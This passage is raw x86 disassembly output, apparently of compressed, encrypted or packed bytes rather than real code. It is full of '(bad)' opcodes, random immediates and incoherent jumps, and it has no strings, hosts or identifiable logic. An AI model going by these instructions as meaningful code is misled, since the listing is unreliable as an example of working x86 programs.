  4216ac:	mov    esi,0x22ebab3d
  4216b1:	sbb    al,0x1f
  4216b3:	push   ds
  4216b4:	lods   eax,DWORD PTR ds:[esi]
  4216b5:	cvtpi2ps xmm7,mm2
  4216b8:	adc    BYTE PTR [eax-0x17efb5a7],ch
  4216be:	lods   al,BYTE PTR ds:[esi]
  4216bf:	popf   
  4216c0:	sbb    DWORD PTR [edx+edx*4],0xfffffff1
  4216c4:	xchg   ebx,eax
  4216c5:	(bad)  
  4216c6:	ss test BYTE PTR es:0x90764482,cl
  4216ce:	sub    edx,DWORD PTR [eax-0x18]
  4216d1:	mov    eax,ds:0x211234f2
  4216d6:	and    al,0xe5
  4216d8:	xlat   BYTE PTR ds:[ebx]
  4216d9:	stc    
  4216da:	xchg   esp,eax
  4216db:	mov    edx,0x743d64fa
  4216e0:	mov    ch,0x87
  4216e2:	jae    0x4216c8
  4216e4:	enter  0x4e10,0x3e
  4216e8:	pusha  
  4216e9:	dec    ebp
  4216ea:	pop    esi
  4216eb:	or     al,0xc1
  4216ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216ee:	adc    BYTE PTR [ebx-0x52],bl
  4216f1:	adc    al,0xb0
  4216f3:	pop    ebp
  4216f4:	data16 data16 xchg BYTE PTR ds:[eax+0xca2b325],cl
  4216fd:	sub    al,0x5
  4216ff:	dec    edi
  421700:	mov    ecx,0xa3bdb2c6
  421705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421706:	mov    ebp,0x46abde91
  42170b:	ja     0x42174f
  42170d:	rcl    DWORD PTR [edi],0x47
  421710:	ret    0xa248
  421713:	mov    dl,0x47
  421715:	xchg   DWORD PTR [ebx-0x2],esi
  421718:	sub    eax,0x7b48b5fc
  42171d:	cld    
  42171e:	adc    eax,0xe3437f25
  421723:	sbb    eax,0xa14ab2e2
  421728:	sar    DWORD PTR [edi+0x1486680c],1
  42172e:	jae    0x421724
  421730:	loop   0x421768
  421732:	ja     0x421717
  421734:	mov    edx,0xb225d6a1
  421739:	sub    BYTE PTR [ecx+0x5b6ff697],ah
  42173f:	pop    ebp
  421740:	adc    al,0x2d
  421742:	xchg   edi,eax
  421743:	lahf   
  421744:	(bad)  
  421745:	fs inc eax
  421747:	test   BYTE PTR [eax-0x24],dh
  42174a:	cmc    
  42174b:	mov    eax,0xbcc46dfa
  421750:	mov    edi,0x7319c013
  421755:	leave  
  421756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421757:	pushf  
  421758:	mov    ecx,0x3cc415c4
  42175d:	xor    eax,0x55353cd7
  421762:	imul   ebx,DWORD PTR [ebx-0x80ccd4d],0x54
  421769:	dec    edx
  42176a:	mov    edi,0x5203dbd0
  42176f:	pop    edi
  421770:	(bad)  
  421771:	aad    0x9e
  421773:	mov    ds:0x60033047,al
  421778:	loopne 0x4217b9
  42177a:	(bad)  
  42177c:	call   0x8128db2e
  421781:	scas   al,BYTE PTR es:[edi]
  421782:	adc    DWORD PTR [ebx-0x50],ecx
  421785:	mul    BYTE PTR [ebx-0x759801cd]
  42178b:	hlt    
  42178c:	sub    dl,BYTE PTR [edi]
  42178e:	push   ds
  42178f:	arpl   cx,sp
  421791:	cmp    DWORD PTR [ebx+ebx*8],ebx
  421794:	xor    al,0x1e
  421796:	push   esi
  421797:	add    ecx,edi
  421799:	inc    esi
  42179a:	js     0x4217ed
  42179c:	xchg   edi,eax
  42179d:	mov    ebp,0x2c1b4ba2
  4217a2:	push   edx
  4217a3:	pop    eax
  4217a4:	ror    eax,1
  4217a6:	pop    ebx
  4217a7:	test   eax,0x54f47570
  4217ac:	rcr    DWORD PTR [edi+0x2f],1
  4217af:	leave  
  4217b0:	(bad)  
  4217b1:	loop   0x421786
  4217b3:	scas   al,BYTE PTR es:[edi]
  4217b4:	lods   eax,DWORD PTR ds:[esi]
  4217b5:	mov    ah,0xc1
  4217b7:	in     eax,dx
  4217b8:	jle    0x421754
  4217ba:	pop    esp
  4217bb:	push   0x5cd31c39
  4217c0:	push   edx
  4217c1:	(bad)  
  4217c2:	daa    
  4217c3:	jmp    0x1c56:0x784a68aa
  4217ca:	dec    esp
  4217cb:	ret    
  4217cc:	mov    al,BYTE PTR ds:0x96d7d1a4
  4217d2:	retf   0xc081
  4217d5:	sbb    DWORD PTR [eax],ebx
  4217d7:	push   0x1
  4217d9:	aad    0xd0
  4217db:	bound  esi,QWORD PTR gs:[ebx]
  4217de:	mov    eax,0x58f378cc
  4217e3:	in     al,dx
  4217e4:	cwde   
  4217e5:	std    
  4217e6:	dec    ebp
  4217e7:	loope  0x4217b8
  4217e9:	fscale 
  4217eb:	jbe    0x42177b
  4217ed:	stos   BYTE PTR es:[edi],al
  4217ee:	pusha  
  4217ef:	jmp    0xa052:0x92b5c7a1
  4217f6:	jae    0x4217dc
  4217f8:	mov    esi,0x14cd8efe
  4217fd:	mov    dh,0xa0
  4217ff:	adc    esp,ebp
  421801:	retf   
  421802:	mov    cl,0xc1
  421804:	in     eax,0xc7
  421806:	arpl   WORD PTR [ecx],bx
  421808:	mov    ch,al
  42180a:	cmp    eax,0x3d9348d7
  421810:	aad    0x68
  421812:	aam    0x74
  421814:	pop    ds
  421815:	call   0x2753:0xb6cf79a3
  42181c:	pop    ss
  42181d:	add    ch,BYTE PTR [eax-0x7f212e79]
  421823:	xchg   esi,eax
  421824:	mov    bh,0x83
  421826:	pop    eax
  421827:	push   edi
  421828:	or     al,0xa3
  42182a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42182b:	xchg   ebp,eax
  42182c:	and    edx,DWORD PTR [ebx]
  42182e:	jecxz  0x42184a
  421830:	es push cs
  421832:	sbb    DWORD PTR [ecx],0xf84e
	...
  421a04:	add    BYTE PTR [eax],al
  421a06:	es inc edi
  421a08:	inc    edx
  421a09:	add    BYTE PTR [edx],ch
  421a0b:	inc    edi
  421a0c:	inc    edx
  421a0d:	add    BYTE PTR [esi],ch
  421a0f:	inc    edi
  421a10:	inc    edx
  421a11:	add    BYTE PTR [edx],dh
  421a13:	inc    edi
  421a14:	inc    edx
  421a15:	add    BYTE PTR [esi],dh
  421a17:	inc    edi
  421a18:	inc    edx
  421a19:	add    BYTE PTR [edx],bh
  421a1b:	inc    edi
  421a1c:	inc    edx
  421a1d:	add    BYTE PTR [esi],bh
  421a1f:	inc    edi
  421a20:	inc    edx
  421a21:	add    BYTE PTR [edx+0x47],al
  421a24:	inc    edx
  421a25:	add    BYTE PTR [ebp-0x29],dl
  421a28:	mov    edx,0x7defba87
  421a2d:	xlat   BYTE PTR ds:[ebx]
  421a2e:	lea    esp,[esi+edx*4+0x6a]
  421a32:	jmp    0x421a36
  421a34:	(bad)  
  421a35:	shr    cl,cl
  421a37:	or     eax,DWORD PTR [ecx]
  421a39:	add    BYTE PTR [esi],bl
  421a3b:	pop    es
  421a3c:	add    BYTE PTR [eax],al
  421a3e:	imul   eax,edi,0xffffff97
  421a41:	fmul   QWORD PTR [ebp+0x7c]
  421a44:	xchg   edi,eax
  421a45:	sbb    al,0xa6
  421a47:	mov    cl,0xd7
  421a49:	neg    ebx
  421a4b:	jg     0x4219f5
  421a4d:	push   esi
  421a4e:	cmp    BYTE PTR [edi],dh
  421a50:	cs inc edi
  421a52:	jb     0x421a0c
  421a54:	shl    BYTE PTR [ecx+ebp*4+0x3a381756],0x9b
  421a5c:	mov    eax,ds:0x480ca3bc
  421a61:	sbb    al,0x3a
  421a63:	leave  
  421a64:	retf   
  421a65:	ret    
  421a66:	pop    ebx
  421a67:	sbb    al,0xc2
  421a69:	inc    esp
  421a6a:	xchg   ebx,eax
  421a6b:	inc    ecx
  421a6c:	ficom  DWORD PTR [edx+ebp*1+0x7a]
  421a70:	or     eax,0x61afa747
  421a75:	dec    edi
  421a76:	mov    ?,WORD PTR [ecx+eiz*1+0x6b]
  421a7a:	jg     0x421a97
  421a7c:	jno    0x421aa4
  421a7e:	add    eax,0xdcef550a
  421a83:	push   ss
  421a84:	(bad)  
  421a85:	add    dh,dl
  421a87:	adc    edx,DWORD PTR [edx+eiz*1-0x6aff1833]
  421a8e:	je     0xcc6583ad
  421a94:	mov    ah,0x63
  421a96:	pop    eax
  421a97:	in     eax,0x42
  421a99:	fsub   QWORD PTR [ebx-0x35]
  421a9c:	push   0xe46753e2
  421aa1:	jno    0x421a99
  421aa3:	leave  
  421aa4:	jne    0x421a52
  421aa6:	push   ss
  421aa7:	push   esp
  421aa8:	jnp    0x421a9f
  421aaa:	out    0xd2,al
  421aac:	in     al,0x56
  421aae:	sbb    al,0x97
  421ab0:	(bad)  
  421ab1:	(bad)  
  421ab2:	call   DWORD PTR [esi+0x47661021]
  421ab8:	std    
  421ab9:	mov    ch,al
  421abb:	push   0xadf3d0e5
  421ac0:	cli    
  421ac1:	cli    
  421ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ac3:	out    dx,eax
  421ac4:	pop    ds
  421ac5:	sahf   
  421ac6:	mov    ch,0x8b
  421ac8:	jbe    0x421b01
  421aca:	loop   0x421abc
  421acc:	sahf   
  421acd:	xor    al,0x1d
  421acf:	jns    0x421b4a
  421ad1:	mov    edx,0x75933019
  421ad6:	addr16 xchg esp,eax
  421ad8:	scas   al,BYTE PTR es:[edi]
  421ad9:	int    0x35
  421adb:	push   esp
  421adc:	arpl   sp,si
  421ade:	popa   
  421adf:	xchg   esi,eax
  421ae0:	rcr    DWORD PTR [edx],cl
  421ae2:	mov    ch,0x42
  421ae4:	sub    DWORD PTR [edx+0x16d2616e],esp
  421aea:	loope  0x421ac1
  421aec:	(bad)  
  421aed:	jno    0x421ade
  421aef:	inc    edx
  421af0:	rcl    BYTE PTR [edx],1
  421af2:	and    eax,0xabdc4a60
  421af7:	mov    ecx,0xf7ece7d1
  421afc:	sbb    DWORD PTR [esi-0x66d76a01],ecx
  421b02:	jnp    0x421a86
  421b04:	pop    ebx
  421b05:	fmul   DWORD PTR [edi+0x72]
  421b08:	sbb    esi,DWORD PTR [ecx]
  421b0a:	mov    dh,0x2a
  421b0c:	test   BYTE PTR [esi-0xfd6fa12],0xf1
  421b13:	and    al,0x27
  421b15:	pop    esp
  421b16:	or     BYTE PTR [ebp+0x4b],bh
  421b19:	aam    0x20
  421b1b:	test   eax,0x42fc4bac
  421b20:	retf   0xd970
  421b23:	fcomip st,st(7)
  421b25:	mov    al,0xe7
  421b27:	jge    0x421af3
  421b29:	mov    DWORD PTR ds:0xbd4c077b,esp
  421b2f:	cmp    DWORD PTR ds:0xa1a22294,esi
  421b35:	ins    DWORD PTR es:[edi],dx
  421b36:	xor    BYTE PTR [esi+0x1e],cl
  421b39:	(bad)  
  421b3a:	mov    edx,0xcc117b3a
  421b3f:	push   edi
  421b40:	cmp    DWORD PTR [esi],0xffffff87
  421b43:	mov    cl,0x46
  421b45:	mov    DWORD PTR [edx+0x6b2a104a],0x4886b120
  421b4f:	push   es
  421b50:	scas   al,BYTE PTR es:[edi]
  421b51:	sbb    DWORD PTR [ecx],eax
  421b53:	in     al,dx
  421b54:	jecxz  0x421b54
  421b56:	mov    DWORD PTR [esi],edx
  421b58:	test   al,0x92
  421b5a:	push   edi
  421b5b:	xor    al,0xe6
  421b5d:	std    
  421b5e:	test   al,0xf
  421b60:	not    dl
  421b62:	push   ds
  421b63:	cmp    al,dh
  421b65:	sti    
  421b66:	lods   eax,DWORD PTR ds:[esi]
  421b67:	adc    esp,DWORD PTR [ecx-0x4496a4d]
  421b6d:	loopne 0x421afc
  421b6f:	jge    0x421b3c
  421b71:	push   cs
  421b72:	les    eax,FWORD PTR [edx+ecx*8+0x4b0eae7a]
  421b79:	retf   
  421b7a:	loope  0x421bf5
  421b7c:	cmp    ebx,edi
  421b7e:	mov    ds:0xb183557d,eax
  421b83:	jne    0x421bc4
  421b85:	add    BYTE PTR [esi+ebx*2+0x48ec56b],bl
  421b8c:	pop    esp
  421b8d:	pop    DWORD PTR [ecx]
  421b8f:	std    
  421b90:	out    0x35,al
  421b92:	cmp    bh,bh
  421b94:	aad    0x56
  421b96:	and    eax,0x5785e3e7
  421b9b:	mov    esp,ecx
  421b9d:	or     al,0xe8
  421b9f:	and    al,0xca
  421ba1:	pop    ss
  421ba2:	aad    0xbf
  421ba4:	mov    ebx,0xb8b92d25
  421ba9:	xor    BYTE PTR [eax+0x37e82269],0x65
  421bb0:	dec    esp
  421bb1:	retf   
  421bb2:	outs   dx,BYTE PTR ds:[esi]
  421bb3:	stos   DWORD PTR es:[edi],eax
  421bb4:	(bad)  
  421bb5:	out    dx,eax
  421bb6:	(bad)  
  421bb7:	mov    ds:0x595afd6b,al
  421bbc:	ja     0x421bd3
  421bbe:	lods   eax,DWORD PTR ds:[esi]
  421bbf:	mov    DWORD PTR [ebp+0x31],0xee5a3724
  421bc6:	jo     0x421bee
  421bc8:	jbe    0x421bd7
  421bca:	sbb    al,0x24
  421bcc:	mov    bl,0x61
  421bce:	pop    edx
  421bcf:	cmp    dl,BYTE PTR [eax-0x5acfb997]
  421bd5:	add    BYTE PTR [ebx-0xf],cl
  421bd8:	mov    dl,0xca
  421bda:	cmp    BYTE PTR [ecx+0x7ea44e84],bl
  421be0:	mov    ?,WORD PTR [eax]
  421be2:	ss xor al,0xc5
  421be5:	mov    ebp,0xc46b5925
  421bea:	xor    ah,ah
  421bec:	fldenv [eax-0x6]
  421bef:	jae    0x421bcf
  421bf1:	lock sahf 
  421bf3:	and    cl,ah
  421bf5:	mov    bl,0x82
  421bf7:	retf   
  421bf8:	stos   BYTE PTR es:[edi],al
  421bf9:	fild   WORD PTR [ebx+0x35]
  421bfc:	(bad)  
  421bfd:	shr    DWORD PTR [ebx+ebp*1-0x31],cl
  421c01:	pop    edx
  421c02:	pop    ebp
  421c03:	mov    al,ds:0xd43ea182
  421c08:	push   0x36
  421c0a:	dec    eax
  421c0b:	jns    0x421c79
  421c0d:	rol    BYTE PTR [edi+0x7197dc0d],1
  421c13:	add    BYTE PTR ds:0xb6ef5ab4,0xe3
  421c1a:	mov    ds:0x93055150,al
  421c1f:	sbb    ebx,DWORD PTR [esi+ebp*1]
  421c22:	in     al,0xe0
  421c24:	xchg   ebp,eax
  421c25:	or     DWORD PTR [edx-0x36],0xffffff9b
  421c29:	imul   edi,DWORD PTR [eax+0x11],0x4d
  421c2d:	stc    
  421c2e:	xchg   DWORD PTR [ebx+ebx*1+0x23],edi
  421c32:	dec    esi
  421c33:	rol    DWORD PTR [esi+0x5c],0x76
  421c37:	add    BYTE PTR [ebx],cl
  421c39:	inc    esi
  421c3a:	in     eax,dx
  421c3b:	xchg   DWORD PTR [esi+0x12d0ee54],edx
  421c41:	outs   dx,BYTE PTR ds:[esi]
  421c42:	sub    DWORD PTR fs:[ebx-0x1d],edi
  421c46:	sub    al,0xa9
  421c48:	adc    bh,BYTE PTR [ebx-0x48]
  421c4b:	dec    edx
  421c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c4d:	ret    
  421c4e:	pop    edx
  421c4f:	push   eax
  421c50:	mov    al,0x5b
  421c52:	out    dx,al
  421c53:	imul   edx,DWORD PTR [edx],0x22
  421c56:	leave  
  421c57:	int3   
  421c58:	pop    es
  421c59:	arpl   WORD PTR [ecx+0x688b32ba],dx
  421c5f:	sbb    eax,0xf81cbf11
  421c64:	ud0    eax,DWORD PTR [ebp-0x20]
  421c68:	dec    ecx
  421c69:	or     edi,DWORD PTR [ebx]
  421c6b:	addr16 xchg ebx,eax
  421c6d:	fist   WORD PTR [edx+esi*1+0x44]
  421c71:	(bad)  
  421c72:	sbb    al,0x7d
  421c74:	sar    DWORD PTR [ebp+0x3a1c5242],1
  421c7a:	mov    esp,DWORD PTR [edi]
  421c7c:	or     BYTE PTR [ecx-0x6a],bl
  421c7f:	add    al,0x99
  421c81:	and    BYTE PTR [ecx+0x5a753f81],ch
  421c87:	aad    0x10
  421c89:	sbb    edx,DWORD PTR [ebp+0x53010c53]
  421c8f:	cmp    DWORD PTR [ebx],esp
  421c91:	lods   al,BYTE PTR ds:[esi]
  421c92:	xchg   esp,eax
  421c93:	add    esi,DWORD PTR [edi]
  421c95:	pop    ecx
  421c96:	aaa    
  421c97:	dec    ebx
  421c98:	inc    edi
  421c99:	lock retf 0x32bc
  421c9d:	dec    esi
  421c9e:	push   edi
  421c9f:	jge    0x421c69
  421ca1:	push   edi
  421ca2:	mov    ebx,0x4bdd7ed6
  421ca7:	mov    bl,BYTE PTR [edi-0xad43b21]
  421cad:	nop
  421cae:	add    eax,0x61ea766
  421cb3:	and    edi,DWORD PTR [eax-0x6]
  421cb6:	dec    esp
  421cb7:	inc    esi
  421cb8:	fisubr DWORD PTR [eax-0x37]
  421cbb:	aad    0x2c
  421cbd:	sti    
  421cbe:	add    eax,0xbd1938b6
  421cc3:	lock sti 
  421cc5:	pushf  
  421cc6:	push   DWORD PTR [esi-0x5c07cfdd]
  421ccc:	mov    ds:0xc3fd7df7,al
  421cd1:	outs   dx,BYTE PTR ds:[esi]
  421cd2:	addr16 dec edx
  421cd4:	test   BYTE PTR [esi],bh
  421cd6:	out    0x7a,al
  421cd8:	push   ss
  421cd9:	(bad)  
  421cda:	out    dx,al
  421cdb:	das    
  421cdc:	mov    bl,0xdd
  421cde:	mov    eax,ds:0xd2799779
  421ce3:	sar    BYTE PTR [ecx-0x40],1
  421ce6:	adc    DWORD PTR [edx],edi
  421ce8:	sub    eax,0x26ea80e2
  421ced:	fistp  QWORD PTR [edi+0xe]
  421cf0:	and    DWORD PTR [edx+0x28c6121e],eax
  421cf6:	mov    BYTE PTR [esi-0x17],bh
  421cf9:	adc    eax,0xd4c5f2fd
  421cfe:	and    edi,DWORD PTR [edx]
  421d00:	outs   dx,DWORD PTR ds:[esi]
  421d01:	es xor eax,0xa141b86c
  421d07:	in     eax,dx
  421d08:	or     BYTE PTR [ecx],dh
  421d0a:	lods   al,BYTE PTR ds:[esi]
  421d0b:	in     eax,dx
  421d0c:	mov    ebp,0x7f2b57f0
  421d11:	sbb    eax,0xce3bac1d
  421d16:	sbb    DWORD PTR [ebp+0x74],0x76
  421d1a:	jecxz  0x421d76
  421d1c:	xchg   ecx,eax
  421d1d:	loopne 0x421cfb
  421d1f:	sahf   
  421d20:	int    0x2d
  421d22:	scas   al,BYTE PTR es:[edi]
  421d23:	mov    bl,0xb1
  421d25:	adc    BYTE PTR [edi],0xe2
  421d28:	arpl   sp,si
  421d2a:	xchg   edx,eax
  421d2b:	push   ebp
  421d2c:	push   eax
  421d2d:	loop   0x421cb2
  421d2f:	inc    esi
  421d30:	and    BYTE PTR [ebx],bh
  421d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d33:	lds    edi,FWORD PTR [eax-0x6e8d3b7]
  421d39:	cmp    BYTE PTR [edi-0x3ca34f71],dl
  421d3f:	out    dx,al
  421d40:	stos   DWORD PTR es:[edi],eax
  421d41:	(bad)  
  421d42:	xchg   edi,eax
  421d43:	mov    al,ds:0xd2f9a9a
  421d48:	jle    0x421d4b
  421d4a:	mov    dh,0xca
  421d4c:	fst    st(1)
  421d4e:	or     al,BYTE PTR [ebp+0x10]
  421d51:	out    dx,eax
  421d52:	push   esi
  421d53:	dec    esi
  421d54:	push   ecx
  421d55:	addr16 dec eax
  421d57:	aas    
  421d58:	(bad)  
  421d59:	push   ecx
  421d5a:	fld    TBYTE PTR [esi-0x12]
  421d5d:	jecxz  0x421d1c
  421d5f:	ds aad 0x12
  421d62:	rcr    ebp,1
  421d64:	jmp    FWORD PTR [eax+0x9]
  421d67:	pop    ss
  421d68:	jl     0x421dc1
  421d6a:	lea    ecx,ds:0x55140c8a
  421d70:	lock leave 
  421d72:	push   es
  421d73:	jnp    0x421d6d
  421d75:	ds jne 0x421dc8
  421d78:	push   es
  421d79:	mov    es,WORD PTR [ecx]
  421d7b:	test   eax,0x64de31f5
  421d80:	jo     0x421d3d
  421d82:	sub    BYTE PTR [edi],al
  421d84:	sbb    edx,edi
  421d86:	jg     0x421dca
  421d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d89:	iret   
  421d8a:	xchg   ebp,eax
  421d8b:	sbb    eax,0x67f87b10
  421d90:	fbld   TBYTE PTR [edi+ecx*2+0x62]
  421d94:	xchg   ebx,eax
  421d95:	out    dx,eax
  421d96:	jecxz  0x421def
  421d98:	loop   0x421dfb
  421d9a:	push   ebp
  421d9b:	enter  0x61a,0x3e
  421d9f:	arpl   WORD PTR [ecx-0x2a],ax
  421da2:	(bad)  
  421da3:	dec    edi
  421da4:	dec    eax
  421da5:	aam    0x49
  421da7:	gs pusha 
  421da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421daa:	xor    al,0xf7
  421dac:	cmp    eax,0xc4bbe827
  421db1:	out    dx,eax
  421db2:	sti    
  421db3:	sbb    eax,DWORD PTR [edx-0x3f9b62d0]
  421db9:	cwde   
  421dba:	add    DWORD PTR [esi-0x5a],eax
  421dbd:	dec    ecx
  421dbe:	inc    esi
  421dbf:	pop    eax
  421dc0:	dec    esi
  421dc1:	pop    ebx
  421dc2:	popf   
  421dc3:	sub    BYTE PTR [ebx+0x25],dh
  421dc6:	cdq    
  421dc7:	mov    ah,0x54
  421dc9:	aas    
  421dca:	into   
  421dcb:	bound  edx,QWORD PTR [esi-0x53]
  421dce:	pop    ecx
  421dcf:	sahf   
  421dd0:	push   ebp
  421dd1:	push   ebx
  421dd2:	jmp    0x70e859cb
  421dd7:	or     ebx,DWORD PTR [eax+0x3d]
  421dda:	dec    ecx
  421ddb:	push   ebx
  421ddc:	mov    ch,0x1e
  421dde:	pop    esp
  421ddf:	retf   
  421de0:	into   
  421de1:	and    eax,0xee4d8fe7
  421de6:	adc    al,BYTE PTR [edx]
  421de8:	dec    ebp
  421de9:	stc    
  421dea:	sub    dh,al
  421dec:	ss jo  0x421deb
  421def:	pop    es
  421df0:	mov    al,ds:0x53b4b1c7
  421df5:	mov    ds:0xea67ce86,al
  421dfa:	gs stos BYTE PTR es:[edi],al
  421dfc:	jg     0x421e19
  421dfe:	into   
  421dff:	outs   dx,BYTE PTR ds:[esi]
  421e00:	fadd   st(0),st
  421e02:	fcmovu st,st(4)
  421e04:	and    edi,DWORD PTR [ecx+0x66]
  421e07:	mov    ds:0x555f6dc0,ax
  421e0d:	rcl    DWORD PTR [edx-0x69],cl
  421e10:	nop
  421e11:	dec    edx
  421e12:	ins    BYTE PTR es:[edi],dx
  421e13:	bts    ebp,esp
  421e16:	loope  0x421e7a
  421e18:	sbb    al,0xb2
  421e1a:	stos   DWORD PTR es:[edi],eax
  421e1b:	(bad)  
  421e1d:	push   eax
  421e1e:	stos   DWORD PTR es:[edi],eax
  421e1f:	sub    BYTE PTR [edx+0x4c],bh
  421e22:	pop    ebx
  421e23:	ds cs cmp bh,ah
  421e27:	test   al,0x6f
  421e29:	sti    
  421e2a:	mov    ah,0x42
  421e2c:	and    eax,0xfd8b56c4
  421e31:	loope  0x421ded
  421e33:	std    
  421e34:	retf   
  421e35:	push   ebp
  421e36:	fwait
  421e37:	dec    eax
  421e38:	mov    dh,0xc9
  421e3a:	xchg   DWORD PTR [eax-0x6f],ebx
  421e3d:	or     eax,DWORD PTR [ecx+0x30349389]
  421e43:	mov    ebx,0x4b4d8df3
  421e48:	adc    DWORD PTR [ecx],esi
  421e4a:	inc    edi
  421e4b:	jmp    0x421ea9
  421e4d:	inc    edx
  421e4e:	ja     0x421e61
  421e50:	pop    es
  421e51:	or     DWORD PTR [eax+0x1e774e65],esp
  421e57:	pop    ss
  421e58:	ja     0x421e38
  421e5a:	pusha  
  421e5b:	mov    ds:0xdad6bc00,eax
  421e60:	dec    eax
  421e61:	mov    eax,0x20984f61
  421e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e67:	add    al,bl
  421e69:	cmp    eax,0xd79b0a4b
  421e6e:	test   DWORD PTR [ebp+0x4b407373],esi
  421e74:	ret    
  421e75:	cmp    DWORD PTR [eax+0x19],ebp
  421e78:	jl     0x421e4c
  421e7a:	scas   al,BYTE PTR es:[edi]
  421e7b:	adc    BYTE PTR [edx+0x9],bl
  421e7e:	sub    eax,0x5f0c674e
  421e83:	ja     0x421e1e
  421e85:	jbe    0x421ea4
  421e87:	ss int 0xba
  421e8a:	scas   eax,DWORD PTR es:[edi]
  421e8b:	xor    ah,BYTE PTR [esi-0x326b38f7]
  421e91:	push   ss
  421e92:	iret   
  421e93:	aad    0x16
  421e95:	jmp    0x421e68
  421e97:	sbb    eax,0x4692d22
  421e9c:	inc    ebp
  421e9d:	dec    esi
  421e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e9f:	sar    DWORD PTR [ecx],cl
  421ea1:	ret    0x13c5
  421ea4:	fcmovnu st,st(5)
  421ea6:	dec    esp
  421ea7:	pusha  
  421ea8:	test   al,0x2e
  421eaa:	fisub  DWORD PTR [edi+0x5b]
  421ead:	lds    edi,FWORD PTR [ebx+0x5f661f5c]
  421eb3:	pop    ecx
  421eb4:	sbb    al,0xba
  421eb6:	jbe    0x421f19
  421eb8:	jmp    0xe0ab:0x56986d2d
  421ebf:	stos   BYTE PTR es:[edi],al
  421ec0:	cs dec edx
  421ec2:	enter  0x42f2,0x7
  421ec6:	cld    
  421ec7:	loop   0x421e66
  421ec9:	scas   eax,DWORD PTR es:[edi]
  421eca:	dec    edx
  421ecb:	mov    ebx,0xffb5d842
  421ed0:	jne    0x421e5f
  421ed2:	or     bh,BYTE PTR [ebp-0x55]
  421ed5:	dec    edi
  421ed6:	add    bh,bh
  421ed8:	fsubr  QWORD PTR [ecx+0x151d436]
  421ede:	pop    es
  421edf:	or     al,0x58
  421ee1:	scas   al,BYTE PTR es:[edi]
  421ee2:	test   BYTE PTR [ecx],dl
  421ee4:	lea    eax,[ebx+0x6129dcf5]
  421eea:	(bad)  
  421eeb:	cmp    BYTE PTR [edx],ah
  421eed:	ins    DWORD PTR es:[edi],dx
  421eee:	dec    edx
  421eef:	dec    edi
  421ef0:	sbb    edx,esi
  421ef2:	fs xor dl,bl
  421ef5:	lds    edx,FWORD PTR [edi-0x7a780f31]
  421efb:	mov    al,ds:0x7129ea5f
  421f00:	fcom   DWORD PTR [ecx+0x76]
  421f03:	fldcw  WORD PTR [ebx+ecx*2+0x5f8d79e6]
  421f0a:	in     al,0xc7
  421f0c:	push   0xffffffb3
  421f0e:	and    eax,0xe76eb435
  421f13:	adc    eax,0x65e3e284
  421f18:	xlat   BYTE PTR ds:[ebx]
  421f19:	jg     0x421f6a
  421f1b:	sub    eax,DWORD PTR [ecx-0x61214cc5]
  421f21:	dec    esp
  421f22:	outs   dx,BYTE PTR ds:[esi]
  421f23:	inc    eax
  421f24:	inc    ebp
  421f25:	aad    0x3e
  421f27:	adc    al,0x33
  421f29:	and    al,0x20
  421f2b:	sub    al,0x8a
  421f2d:	fdivp  st(3),st
  421f2f:	dec    edx
  421f30:	fstp   DWORD PTR [ebx]
  421f32:	fnstcw WORD PTR [ebx-0x71630e06]
  421f38:	inc    esi
  421f39:	shr    BYTE PTR ds:0xa65471e0,1
  421f3f:	and    DWORD PTR [ebx],ebx
  421f41:	sub    BYTE PTR [ecx-0xa],0x48
  421f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f46:	stc    
  421f47:	dec    ebx
  421f48:	jecxz  0x421f61
  421f4a:	ja     0x421f52
  421f4c:	push   ds
  421f4d:	stos   BYTE PTR es:[edi],al
  421f4e:	inc    ebx
  421f4f:	mov    edx,0x1b6e1ad2
  421f54:	fs inc eax
  421f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f57:	outs   dx,BYTE PTR ds:[esi]
  421f58:	jne    0x421ef7
  421f5a:	rol    DWORD PTR [ebx],1
  421f5c:	sbb    dh,BYTE PTR [eax]
  421f5e:	jge    0x421fc9
  421f60:	xchg   BYTE PTR [ecx],al
  421f62:	add    ebx,DWORD PTR [esi]
  421f64:	cmp    bl,BYTE PTR [eax-0x67]
  421f67:	ja     0x421f60
  421f69:	enter  0x3e34,0xa2
  421f6d:	xor    esp,DWORD PTR [ebp-0x71]
  421f70:	lods   al,BYTE PTR ds:[esi]
  421f71:	mov    eax,DWORD PTR [ebx]
  421f73:	mov    edx,0x9e1ce99e
  421f78:	xchg   ebx,eax
  421f79:	push   es
  421f7a:	les    edi,FWORD PTR [ebp+0x3a]
  421f7d:	ss jg  0x421fac
  421f80:	jb     0x421f55
  421f82:	and    ch,BYTE PTR [eax+esi*2]
  421f85:	adc    BYTE PTR [esi],0xbb
  421f88:	jb     0x421f31
  421f8a:	mov    dl,0x51
  421f8c:	mov    ebp,0xec8f952a
  421f91:	ja     0x421fd4
  421f93:	mov    dl,0xa1
  421f95:	add    bh,BYTE PTR [ebp-0x5f20e1e2]
  421f9b:	ffreep st(2)
  421f9d:	dec    eax
  421f9e:	adc    ebx,DWORD PTR [edx+0x5a5f934c]
  421fa4:	add    edi,edx
  421fa6:	lock jge 0x421fea
  421fa9:	das    
  421faa:	inc    eax
  421fab:	in     eax,dx
  421fac:	jle    0x42200d
  421fae:	and    edi,DWORD PTR [eax+0x2b]
  421fb1:	xor    esp,DWORD PTR fs:[ebx+ebp*4-0x5a]
  421fb6:	ds pop esi
  421fb8:	add    eax,0xb6bcada6
  421fbd:	sub    BYTE PTR [ebp+0x344e3251],0xe8
  421fc4:	cld    
  421fc5:	inc    esi
  421fc6:	outs   dx,DWORD PTR ds:[esi]
  421fc8:	adc    ebp,edi
  421fca:	test   ebx,esp
  421fcc:	sbb    ch,BYTE PTR [esi+0x5acbc03f]
  421fd2:	iret   
  421fd3:	jo     0x421f63
  421fd5:	fwait
